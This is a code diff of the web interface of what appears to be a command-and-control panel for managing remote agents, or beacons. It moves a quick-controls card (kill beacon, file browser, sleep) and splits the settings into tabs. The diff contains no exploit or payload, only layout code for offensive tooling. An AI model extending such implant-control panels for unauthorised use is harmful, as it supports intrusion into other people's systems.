@@ -575,9 +575,20 @@ async function renderSessionView(agentId) {
           <div style="color:var(--text3);font-size:11px">${t('loading')}</div>
         </div>
         <div class="info-card">
-          <h3>${t('note_label')}</h3>
-          <textarea id="agent-note" style="width:100%;background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:var(--font-mono);font-size:11px;padding:8px;resize:none;height:80px;outline:none" placeholder="${t('note_placeholder')}"></textarea>
-          <button class="btn btn-sm" style="margin-top:6px;width:100%" onclick="saveNote('${escapeHtml(agentId)}')">${t('save_note')}</button>
+          <h3>⚡ ${_lang==='es'?'Controles rápidos':'Quick Controls'}</h3>
+          <button class="btn btn-sm btn-danger" style="width:100%;margin-bottom:6px" onclick="killBeacon('${escapeHtml(agentId)}')">
+            💀 ${_lang==='es'?'Matar beacon (kill PID)':'Kill beacon (kill PID)'}
+          </button>
+          <button class="btn btn-sm btn-ghost" style="width:100%;margin-bottom:6px" onclick="openFileBrowser('${escapeHtml(agentId)}')">
+            📂 ${_lang==='es'?'File Browser':'File Browser'}
+          </button>
+          <div id="sleep-wrap" style="display:flex;gap:6px;align-items:center;margin-top:4px">
+            <input type="number" id="quick-sleep" value="30" min="1" max="3600"
+              style="width:70px;background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:var(--font-mono);font-size:12px;padding:4px 6px;outline:none">
+            <button class="btn btn-sm btn-ghost" style="flex:1" onclick="quickSleep('${escapeHtml(agentId)}')">
+              ⏱ Sleep
+            </button>
+          </div>
         </div>
         <div class="info-card">
           <h3>${t('socks5_label')}</h3>
@@ -604,20 +615,9 @@ async function renderSessionView(agentId) {
           <button class="btn btn-sm btn-ghost" style="width:100%" onclick="exportTasks('${escapeHtml(agentId)}','json')">${t('export_json')}</button>
         </div>
         <div class="info-card">
-          <h3>⚡ ${_lang==='es'?'Controles rápidos':'Quick Controls'}</h3>
-          <button class="btn btn-sm btn-danger" style="width:100%;margin-bottom:6px" onclick="killBeacon('${escapeHtml(agentId)}')">
-            💀 ${_lang==='es'?'Matar beacon (kill PID)':'Kill beacon (kill PID)'}
-          </button>
-          <button class="btn btn-sm btn-ghost" style="width:100%;margin-bottom:6px" onclick="openFileBrowser('${escapeHtml(agentId)}')">
-            📂 ${_lang==='es'?'File Browser':'File Browser'}
-          </button>
-          <div id="sleep-wrap" style="display:flex;gap:6px;align-items:center;margin-top:4px">
-            <input type="number" id="quick-sleep" value="30" min="1" max="3600"
-              style="width:70px;background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:var(--font-mono);font-size:12px;padding:4px 6px;outline:none">
-            <button class="btn btn-sm btn-ghost" style="flex:1" onclick="quickSleep('${escapeHtml(agentId)}')">
-              ⏱ Sleep
-            </button>
-          </div>
+          <h3>${t('note_label')}</h3>
+          <textarea id="agent-note" style="width:100%;background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);font-family:var(--font-mono);font-size:11px;padding:8px;resize:none;height:80px;outline:none" placeholder="${t('note_placeholder')}"></textarea>
+          <button class="btn btn-sm" style="margin-top:6px;width:100%" onclick="saveNote('${escapeHtml(agentId)}')">${t('save_note')}</button>
         </div>
       </div>
       <div class="session-terminal">
@@ -1484,235 +1484,261 @@ function renderGenerateView() {
 }
 
 // ── Settings View ─────────────────────────────────────────
+function showSettingsTab(tab) {
+  document.querySelectorAll('.st-tab').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.st-panel').forEach(el => el.style.display = 'none');
+  const btn = document.getElementById('stab-' + tab);
+  const panel = document.getElementById('stpanel-' + tab);
+  if (btn) btn.classList.add('active');
+  if (panel) panel.style.display = '';
+}
+
 async function renderSettingsView() {
   const content = document.getElementById('content');
-  content.innerHTML = `
-    <div style="max-width:560px;margin:0 auto;display:flex;flex-direction:column;gap:16px;padding-bottom:40px">
+  const tabs = [
+    { id: 'account',       icon: '🔐', en: 'Account',       es: 'Cuenta' },
+    { id: 'users',         icon: '👥', en: 'Users',          es: 'Usuarios' },
+    { id: 'security',      icon: '🛡',  en: 'Security',       es: 'Seguridad' },
+    { id: 'notifications', icon: '🔔', en: 'Notifications',  es: 'Notificaciones' },
+    ...(_isAdmin ? [{ id: 'audit', icon: '🔍', en: 'Audit Log', es: 'Auditoría' }] : []),
+  ];
 
-      <!-- Change Password -->
-      <div class="info-card" style="margin:0">
-        <h3>${t('st_changepw')}</h3>
-        <div class="error-msg" id="st-pw-error"></div>
-        <div id="st-pw-ok" style="display:none;color:var(--online);font-size:12px;margin-bottom:12px">${t('st_pw_updated')}</div>
-        <div class="form-group" style="margin-bottom:12px">
-          <label>${t('st_current_pw')}</label>
-          <input type="password" id="st-pw-current" autocomplete="current-password">
-        </div>
-        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:14px">
-          <div class="form-group" style="margin:0">
-            <label>${t('st_new_pw')}</label>
-            <input type="password" id="st-pw-new" autocomplete="new-password">
-          </div>
-          <div class="form-group" style="margin:0">
-            <label>${t('st_confirm_pw')}</label>
-            <input type="password" id="st-pw-confirm" autocomplete="new-password">
-          </div>
-        </div>
-        <button class="btn btn-sm" onclick="settingsChangePw()">${t('st_update_pw_btn')}</button>
+  content.innerHTML = `
+    <div style="display:flex;flex-direction:column;height:calc(100vh - 100px)">
+
+      <!-- Tab strip -->
+      <div style="display:flex;gap:0;border-bottom:1px solid var(--border);flex-shrink:0;margin-bottom:20px">
+        ${tabs.map((tab, i) => `
+          <button class="st-tab${i===0?' active':''}" id="stab-${tab.id}" onclick="showSettingsTab('${tab.id}')">
+            ${tab.icon} ${_lang==='es'?tab.es:tab.en}
+          </button>`).join('')}
       </div>
 
-      <!-- MFA -->
-      <div class="info-card" style="margin:0">
-        <h3>${t('mfa_title')}</h3>
-        <p style="font-size:11px;color:var(--text3);margin-bottom:14px;line-height:1.6">
-          ${t('mfa_desc')}
-        </p>
-        <div id="mfa-status-row" style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
-          <span id="mfa-badge" style="font-size:12px">${t('mfa_loading')}</span>
-          <button id="mfa-toggle-btn" class="btn btn-sm" onclick="mfaToggle()" style="display:none"></button>
-        </div>
+      <!-- Scrollable content area -->
+      <div style="flex:1;overflow-y:auto;padding-bottom:40px">
 
-        <!-- Setup flow (hidden until user clicks Enable) -->
-        <div id="mfa-setup-box" style="display:none">
-          <p style="font-size:11px;color:var(--text3);margin-bottom:10px;line-height:1.6">
-            ${t('mfa_scan_desc')}
-          </p>
-          <div style="display:flex;gap:20px;align-items:flex-start;flex-wrap:wrap;margin-bottom:12px">
-            <div id="mfa-qr-canvas" style="background:#fff;padding:6px;border-radius:4px;display:inline-block"></div>
-            <div>
-              <div style="font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">${t('mfa_manual_key')}</div>
-              <div id="mfa-secret-display" style="font-family:var(--font-mono);font-size:12px;color:var(--accent2);word-break:break-all;max-width:200px"></div>
+        <!-- ── ACCOUNT ── -->
+        <div class="st-panel" id="stpanel-account">
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;max-width:860px">
+
+            <!-- Change Password -->
+            <div class="info-card" style="margin:0">
+              <h3>🔑 ${t('st_changepw')}</h3>
+              <div class="error-msg" id="st-pw-error"></div>
+              <div id="st-pw-ok" style="display:none;color:var(--online);font-size:12px;margin-bottom:12px">${t('st_pw_updated')}</div>
+              <div class="form-group">
+                <label>${t('st_current_pw')}</label>
+                <input type="password" id="st-pw-current" autocomplete="current-password">
+              </div>
+              <div class="form-group">
+                <label>${t('st_new_pw')}</label>
+                <input type="password" id="st-pw-new" autocomplete="new-password">
+              </div>
+              <div class="form-group" style="margin-bottom:16px">
+                <label>${t('st_confirm_pw')}</label>
+                <input type="password" id="st-pw-confirm" autocomplete="new-password">
+              </div>
+              <button class="btn btn-sm" onclick="settingsChangePw()">${t('st_update_pw_btn')}</button>
+            </div>
+
+            <!-- MFA -->
+            <div class="info-card" style="margin:0">
+              <h3>🔒 ${t('mfa_title')}</h3>
+              <p style="font-size:11px;color:var(--text3);margin-bottom:14px;line-height:1.6">${t('mfa_desc')}</p>
+              <div id="mfa-status-row" style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
+                <span id="mfa-badge" style="font-size:12px">${t('mfa_loading')}</span>
+                <button id="mfa-toggle-btn" class="btn btn-sm" onclick="mfaToggle()" style="display:none"></button>
+              </div>
+              <div id="mfa-setup-box" style="display:none">
+                <p style="font-size:11px;color:var(--text3);margin-bottom:10px;line-height:1.6">${t('mfa_scan_desc')}</p>
+                <div style="display:flex;gap:20px;align-items:flex-start;flex-wrap:wrap;margin-bottom:12px">
+                  <div id="mfa-qr-canvas" style="background:#fff;padding:6px;border-radius:4px;display:inline-block"></div>
+                  <div>
+                    <div style="font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">${t('mfa_manual_key')}</div>
+                    <div id="mfa-secret-display" style="font-family:var(--font-mono);font-size:12px;color:var(--accent2);word-break:break-all;max-width:200px"></div>
+                  </div>
+                </div>
+                <div class="error-msg" id="mfa-setup-error"></div>
+                <div style="display:flex;gap:8px;align-items:center">
+                  <input type="text" id="mfa-confirm-code" inputmode="numeric" maxlength="6" placeholder="000000"
+                    style="width:120px;font-family:var(--font-mono);font-size:18px;letter-spacing:4px;text-align:center"
+                    onkeydown="if(event.key==='Enter') mfaConfirm()">
+                  <button class="btn btn-sm" onclick="mfaConfirm()">${t('mfa_confirm_btn')}</button>
+                  <button class="btn btn-sm btn-ghost" onclick="mfaCancelSetup()">${t('mfa_cancel')}</button>
+                </div>
+              </div>
+              <div id="mfa-disable-box" style="display:none">
+                <p style="font-size:11px;color:var(--warning);margin-bottom:10px">${t('mfa_disable_prompt')}</p>
+                <div class="error-msg" id="mfa-disable-error"></div>
+                <div style="display:flex;gap:8px;align-items:center">
+                  <input type="text" id="mfa-disable-code" inputmode="numeric" maxlength="6" placeholder="000000"
+                    style="width:120px;font-family:var(--font-mono);font-size:18px;letter-spacing:4px;text-align:center"
+                    onkeydown="if(event.key==='Enter') mfaDisableConfirm()">
+                  <button class="btn btn-sm btn-danger" onclick="mfaDisableConfirm()">${t('mfa_disable_btn')}</button>
+                  <button class="btn btn-sm btn-ghost" onclick="mfaCancelDisable()">${t('mfa_disable_cancel')}</button>
+                </div>
+              </div>
             </div>
           </div>
-          <div class="error-msg" id="mfa-setup-error"></div>
-          <div style="display:flex;gap:8px;align-items:center">
-            <input type="text" id="mfa-confirm-code" inputmode="numeric" maxlength="6"
-                   placeholder="000000"
-                   style="width:120px;font-family:var(--font-mono);font-size:18px;letter-spacing:4px;text-align:center"
-                   onkeydown="if(event.key==='Enter') mfaConfirm()">
-            <button class="btn btn-sm" onclick="mfaConfirm()">${t('mfa_confirm_btn')}</button>
-            <button class="btn btn-sm btn-ghost" onclick="mfaCancelSetup()">${t('mfa_cancel')}</button>
+        </div>
+
+        <!-- ── USERS ── -->
+        <div class="st-panel" id="stpanel-users" style="display:none">
+          <div style="max-width:560px">
+            <div class="info-card" style="margin:0">
+              <h3>👥 ${t('users_title')}</h3>
+              <table style="width:100%;margin-bottom:14px">
+                <thead><tr>
+                  <th>${t('col_username')}</th>
+                  <th style="width:80px;text-align:center">MFA</th>
+                  <th style="width:40px"></th>
+                </tr></thead>
+                <tbody id="users-tbody"></tbody>
+              </table>
+              <div class="error-msg" id="users-error"></div>
+              <div style="display:grid;grid-template-columns:1fr 1fr auto;gap:8px;align-items:end">
+                <div class="form-group" style="margin:0">
+                  <label>${t('new_user_label')}</label>
+                  <input type="text" id="new-user-name" placeholder="operador1">
+                </div>
+                <div class="form-group" style="margin:0">
+                  <label>${t('new_user_pass_label')}</label>
+                  <input type="password" id="new-user-pass" placeholder="••••••••••••">
+                </div>
+                <button class="btn btn-sm btn-ghost" style="margin-bottom:1px" onclick="createUser()">${t('create_user_btn')}</button>
+              </div>
+            </div>
           </div>
         </div>
 
-        <!-- Disable flow -->
-        <div id="mfa-disable-box" style="display:none">
-          <p style="font-size:11px;color:var(--warning);margin-bottom:10px">
-            ${t('mfa_disable_prompt')}
-          </p>
-          <div class="error-msg" id="mfa-disable-error"></div>
-          <div style="display:flex;gap:8px;align-items:center">
-            <input type="text" id="mfa-disable-code" inputmode="numeric" maxlength="6"
-                   placeholder="000000"
-                   style="width:120px;font-family:var(--font-mono);font-size:18px;letter-spacing:4px;text-align:center"
-                   onkeydown="if(event.key==='Enter') mfaDisableConfirm()">
-            <button class="btn btn-sm btn-danger" onclick="mfaDisableConfirm()">${t('mfa_disable_btn')}</button>
-            <button class="btn btn-sm btn-ghost" onclick="mfaCancelDisable()">${t('mfa_disable_cancel')}</button>
+        <!-- ── SECURITY ── -->
+        <div class="st-panel" id="stpanel-security" style="display:none">
+          <div style="max-width:620px">
+            <div class="info-card" style="margin:0">
+              <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px">
+                <h3 style="margin:0">🛡 ${t('wl_title')}</h3>
+                <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+                  <input type="checkbox" id="wl-enabled" style="accent-color:var(--accent)" onchange="toggleWhitelistWarning()">
+                  ${t('wl_enable')}
+                </label>
+              </div>
+              <p style="font-size:11px;color:var(--text3);margin-bottom:14px;line-height:1.6">${t('wl_desc')}</p>
+              <div id="wl-myip-banner" style="display:flex;align-items:center;justify-content:space-between;background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:10px 14px;margin-bottom:14px">
+                <div>
+                  <div style="font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:1px;margin-bottom:3px">${t('wl_detected_ip')}</div>
+                  <div id="wl-myip-val" style="font-size:14px;font-family:var(--font-mono);color:var(--accent2)">${t('wl_detecting')}</div>
+                </div>
+                <button class="btn btn-sm btn-ghost" onclick="useMyIp()">${t('wl_use_ip')}</button>
+              </div>
+              <div id="wl-warning" style="display:none;background:rgba(245,158,11,0.1);border:1px solid rgba(245,158,11,0.3);border-radius:6px;padding:10px 14px;font-size:12px;color:var(--warning);margin-bottom:14px;line-height:1.6">
+                ${t('wl_warning')}
+              </div>
+              <table style="width:100%;margin-bottom:14px">
+                <thead><tr>
+                  <th style="width:38%">${t('col_name')}</th>
+                  <th>${t('col_pub_ip')}</th>
+                  <th style="width:40px"></th>
+                </tr></thead>
+                <tbody id="wl-tbody"></tbody>
+              </table>
+              <div style="display:grid;grid-template-columns:1fr 1fr auto;gap:8px;align-items:end;margin-bottom:14px">
+                <div class="form-group" style="margin:0">
+                  <label>${t('col_name')}</label>
+                  <input type="text" id="wl-new-name" placeholder="${t('wl_name_placeholder')}">
+                </div>
+                <div class="form-group" style="margin:0">
+                  <label>${t('col_pub_ip')}</label>
+                  <input type="text" id="wl-new-ip" placeholder="1.2.3.4" style="font-family:var(--font-mono)">
+                </div>
+                <button class="btn btn-sm btn-ghost" style="margin-bottom:1px" onclick="addWhitelistEntry()">+ Add</button>
+              </div>
+              <div style="display:flex;align-items:center;gap:12px">
+                <button class="btn btn-sm" onclick="saveWhitelist()">${t('wl_save')}</button>
+                <span id="wl-status" style="font-size:12px;color:var(--text3)"></span>
+              </div>
+            </div>
           </div>
         </div>
+
+        <!-- ── NOTIFICATIONS ── -->
+        <div class="st-panel" id="stpanel-notifications" style="display:none">
+          <div style="max-width:600px">
+            <div class="info-card" style="margin:0">
+              <h3>🔔 Webhook</h3>
+              <p style="font-size:11px;color:var(--text3);margin-bottom:14px;line-height:1.6">
+                ${_lang==='es'?'Notificaciones a Discord / Slack / cualquier webhook. Usa un embed de Discord por defecto.':'Notifications to Discord / Slack / any webhook. Uses Discord embed format by default.'}
+              </p>
+              <div class="form-group" style="margin-bottom:14px">
+                <label>Webhook URL</label>
+                <input type="text" id="wh-url" placeholder="https://discord.com/api/webhooks/..." style="font-family:var(--font-mono);font-size:11px">
+              </div>
+              <div style="background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:12px 14px;margin-bottom:14px">
+                <div style="font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:1px;margin-bottom:10px">${_lang==='es'?'Eventos':'Events'}</div>
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px 24px" id="wh-events-wrap">
+                  <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+                    <input type="checkbox" id="whe-new_agent" style="accent-color:var(--accent)">
+                    <span>${_lang==='es'?'Nuevo agente':'New agent'}</span>
+                  </label>
+                  <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+                    <input type="checkbox" id="whe-login" style="accent-color:var(--accent)">
+                    <span>${_lang==='es'?'Login exitoso':'Successful login'}</span>
+                  </label>
+                  <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+                    <input type="checkbox" id="whe-login_fail" style="accent-color:var(--accent)">
+                    <span>${_lang==='es'?'Login fallido':'Failed login'}</span>
+                  </label>
+                  <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+                    <input type="checkbox" id="whe-agent_deleted" style="accent-color:var(--accent)">
+                    <span>${_lang==='es'?'Agente eliminado':'Agent deleted'}</span>
+                  </label>
+                  <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+                    <input type="checkbox" id="whe-task_sent" style="accent-color:var(--accent)">
+                    <span>${_lang==='es'?'Tarea enviada':'Task sent'}</span>
+                  </label>
+                </div>
+              </div>
+              <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap">
+                <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
+                  <input type="checkbox" id="wh-enabled" style="accent-color:var(--accent)">
+                  <span>${_lang==='es'?'Activar':'Enable'}</span>
+                </label>
+                <button class="btn btn-sm" onclick="saveWebhook()">${_lang==='es'?'Guardar':'Save'}</button>
+                <button class="btn btn-sm btn-ghost" onclick="testWebhook()">${_lang==='es'?'Probar':'Test'}</button>
+                <span id="wh-status" style="font-size:12px;color:var(--text3)"></span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        ${_isAdmin ? `
+        <!-- ── AUDIT ── -->
+        <div class="st-panel" id="stpanel-audit" style="display:none">
+          <div class="info-card" style="margin:0">
+            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">
+              <h3 style="margin:0">🔍 ${_lang==='es'?'Registro de auditoría':'Audit Log'}</h3>
+              <div style="display:flex;gap:8px;align-items:center">
+                <select id="audit-filter" onchange="loadAuditLog()" style="background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:11px;padding:4px 8px;outline:none">
+                  <option value="">${_lang==='es'?'Todos':'All'}</option>
+                  <option value="LOGIN">LOGIN</option>
+                  <option value="LOGIN_FAIL">LOGIN_FAIL</option>
+                  <option value="TASK_SENT">TASK_SENT</option>
+                  <option value="FILE_UPLOAD">FILE_UPLOAD</option>
+                  <option value="AGENT_DELETED">AGENT_DELETED</option>
+                  <option value="USER_CREATED">USER_CREATED</option>
+                  <option value="USER_DELETED">USER_DELETED</option>
+                  <option value="PASSWORD_CHANGED">PASSWORD_CHANGED</option>
+                </select>
+                <button class="btn btn-sm btn-ghost" onclick="loadAuditLog()">↻</button>
+                <button class="btn btn-sm btn-danger" onclick="clearAuditLog()" style="font-size:11px">${_lang==='es'?'Limpiar':'Clear'}</button>
+              </div>
+            </div>
+            <div id="audit-tbody" style="max-height:calc(100vh - 280px);overflow-y:auto">
+              <div style="color:var(--text3);font-size:12px">${_lang==='es'?'Cargando...':'Loading...'}</div>
+            </div>
+          </div>
+        </div>` : ''}
+
       </div>
-
-      <!-- Users -->
-      <div class="info-card" style="margin:0">
-        <h3>${t('users_title')}</h3>
-        <table style="width:100%;margin-bottom:14px">
-          <thead>
-            <tr>
-              <th>${t('col_username')}</th>
-              <th style="width:80px;text-align:center">MFA</th>
-              <th style="width:40px"></th>
-            </tr>
-          </thead>
-          <tbody id="users-tbody"></tbody>
-        </table>
-        <div class="error-msg" id="users-error"></div>
-        <div style="display:grid;grid-template-columns:1fr 1fr auto;gap:8px;align-items:end">
-          <div class="form-group" style="margin:0">
-            <label>${t('new_user_label')}</label>
-            <input type="text" id="new-user-name" placeholder="operador1">
-          </div>
-          <div class="form-group" style="margin:0">
-            <label>${t('new_user_pass_label')}</label>
-            <input type="password" id="new-user-pass" placeholder="••••••••••••">
-          </div>
-          <button class="btn btn-sm btn-ghost" style="margin-bottom:1px" onclick="createUser()">${t('create_user_btn')}</button>
-        </div>
-      </div>
-
-      <!-- IP Whitelist -->
-      <div class="info-card" style="margin:0">
-        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px">
-          <h3 style="margin:0">${t('wl_title')}</h3>
-          <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
-            <input type="checkbox" id="wl-enabled" style="accent-color:var(--accent)" onchange="toggleWhitelistWarning()">
-            ${t('wl_enable')}
-          </label>
-        </div>
-        <p style="font-size:11px;color:var(--text3);margin-bottom:14px;line-height:1.6">
-          ${t('wl_desc')}
-        </p>
-
-        <!-- Detected IP banner -->
-        <div id="wl-myip-banner" style="display:flex;align-items:center;justify-content:space-between;background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:10px 14px;margin-bottom:14px">
-          <div>
-            <div style="font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:1px;margin-bottom:3px">${t('wl_detected_ip')}</div>
-            <div id="wl-myip-val" style="font-size:14px;font-family:var(--font-mono);color:var(--accent2)">${t('wl_detecting')}</div>
-          </div>
-          <button class="btn btn-sm btn-ghost" onclick="useMyIp()">${t('wl_use_ip')}</button>
-        </div>
-
-        <div id="wl-warning" style="display:none;background:rgba(245,158,11,0.1);border:1px solid rgba(245,158,11,0.3);border-radius:6px;padding:10px 14px;font-size:12px;color:var(--warning);margin-bottom:14px;line-height:1.6">
-          ${t('wl_warning')}
-        </div>
-
-        <table style="width:100%;margin-bottom:14px">
-          <thead>
-            <tr>
-              <th style="width:38%">${t('col_name')}</th>
-              <th>${t('col_pub_ip')}</th>
-              <th style="width:40px"></th>
-            </tr>
-          </thead>
-          <tbody id="wl-tbody"></tbody>
-        </table>
-
-        <div style="display:grid;grid-template-columns:1fr 1fr auto;gap:8px;align-items:end;margin-bottom:14px">
-          <div class="form-group" style="margin:0">
-            <label>${t('col_name')}</label>
-            <input type="text" id="wl-new-name" placeholder="${t('wl_name_placeholder')}">
-          </div>
-          <div class="form-group" style="margin:0">
-            <label>${t('col_pub_ip')}</label>
-            <input type="text" id="wl-new-ip" placeholder="1.2.3.4" style="font-family:var(--font-mono)">
-          </div>
-          <button class="btn btn-sm btn-ghost" style="margin-bottom:1px" onclick="addWhitelistEntry()">+ Add</button>
-        </div>
-
-        <div style="display:flex;align-items:center;gap:12px">
-          <button class="btn btn-sm" onclick="saveWhitelist()">${t('wl_save')}</button>
-          <span id="wl-status" style="font-size:12px;color:var(--text3)"></span>
-        </div>
-      </div>
-
-      <!-- Webhook -->
-      <div class="info-card" style="margin:0">
-        <h3>🔔 Webhook</h3>
-        <p style="font-size:11px;color:var(--text3);margin-bottom:14px;line-height:1.6">
-          ${_lang==='es'?'Notificaciones a Discord / Slack / cualquier webhook. Usa un embed de Discord por defecto.':'Notifications to Discord / Slack / any webhook. Uses Discord embed format by default.'}
-        </p>
-        <div class="form-group" style="margin-bottom:10px">
-          <label>Webhook URL</label>
-          <input type="text" id="wh-url" placeholder="https://discord.com/api/webhooks/..." style="font-family:var(--font-mono);font-size:11px">
-        </div>
-        <div style="display:flex;flex-wrap:wrap;gap:10px 24px;margin-bottom:14px" id="wh-events-wrap">
-          <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
-            <input type="checkbox" id="whe-new_agent" style="accent-color:var(--accent)">
-            <span>${_lang==='es'?'Nuevo agente':'New agent'}</span>
-          </label>
-          <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
-            <input type="checkbox" id="whe-login" style="accent-color:var(--accent)">
-            <span>${_lang==='es'?'Login exitoso':'Successful login'}</span>
-          </label>
-          <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
-            <input type="checkbox" id="whe-login_fail" style="accent-color:var(--accent)">
-            <span>${_lang==='es'?'Login fallido':'Failed login'}</span>
-          </label>
-          <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
-            <input type="checkbox" id="whe-agent_deleted" style="accent-color:var(--accent)">
-            <span>${_lang==='es'?'Agente eliminado':'Agent deleted'}</span>
-          </label>
-          <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
-            <input type="checkbox" id="whe-task_sent" style="accent-color:var(--accent)">
-            <span>${_lang==='es'?'Tarea enviada':'Task sent'}</span>
-          </label>
-        </div>
-        <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap">
-          <label style="display:flex;align-items:center;gap:8px;cursor:pointer;font-size:12px;color:var(--text2)">
-            <input type="checkbox" id="wh-enabled" style="accent-color:var(--accent)">
-            <span>${_lang==='es'?'Activar':'Enable'}</span>
-          </label>
-          <button class="btn btn-sm" onclick="saveWebhook()">${_lang==='es'?'Guardar':'Save'}</button>
-          <button class="btn btn-sm btn-ghost" onclick="testWebhook()">${_lang==='es'?'Probar':'Test'}</button>
-          <span id="wh-status" style="font-size:12px;color:var(--text3)"></span>
-        </div>
-      </div>
-
-      ${_isAdmin ? `
-      <!-- Audit Log (admin only) -->
-      <div class="info-card" style="margin:0">
-        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
-          <h3 style="margin:0">🔍 ${_lang==='es'?'Registro de auditoría':'Audit Log'}</h3>
-          <div style="display:flex;gap:8px;align-items:center">
-            <select id="audit-filter" onchange="loadAuditLog()" style="background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text);font-size:11px;padding:4px 8px;outline:none">
-              <option value="">${_lang==='es'?'Todos':'All'}</option>
-              <option value="LOGIN">LOGIN</option>
-              <option value="LOGIN_FAIL">LOGIN_FAIL</option>
-              <option value="TASK_SENT">TASK_SENT</option>
-              <option value="FILE_UPLOAD">FILE_UPLOAD</option>
-              <option value="AGENT_DELETED">AGENT_DELETED</option>
-              <option value="USER_CREATED">USER_CREATED</option>
-              <option value="USER_DELETED">USER_DELETED</option>
-              <option value="PASSWORD_CHANGED">PASSWORD_CHANGED</option>
-            </select>
-            <button class="btn btn-sm btn-ghost" onclick="loadAuditLog()">↻</button>
-            <button class="btn btn-sm btn-danger" onclick="clearAuditLog()" style="font-size:11px">${_lang==='es'?'Limpiar':'Clear'}</button>
-          </div>
-        </div>
-        <div id="audit-tbody" style="max-height:340px;overflow-y:auto">
-          <div style="color:var(--text3);font-size:12px">${_lang==='es'?'Cargando...':'Loading...'}</div>
-        </div>
-      </div>` : ''}
-
     </div>`;
 
   // Load current whitelist
